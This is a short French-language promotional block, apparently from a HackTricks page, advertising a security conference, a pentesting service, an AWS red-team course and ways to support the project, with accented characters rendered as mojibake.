[**DragonJAR Security Conference est un √©v√©nement international de cybers√©curit√©**](https://www.dragonjarcon.org/)**Configuration imm√©diatement disponible pour l'√©valuation des vuln√©rabilit√©s et le pentesting**. Lancez un pentest complet de n'importe o√π avec plus de 20 outils et fonctionnalit√©s allant de la reconnaissance au rapport. Nous ne rempla√ßons pas les pentesters - nous d√©veloppons des outils personnalis√©s, des modules de d√©tection et d'exploitation pour leur redonner du temps pour approfondir, obtenir des acc√®s et s'amuser.

{% embed url="https://pentest-tools.com/" %}

<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez**-moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
```
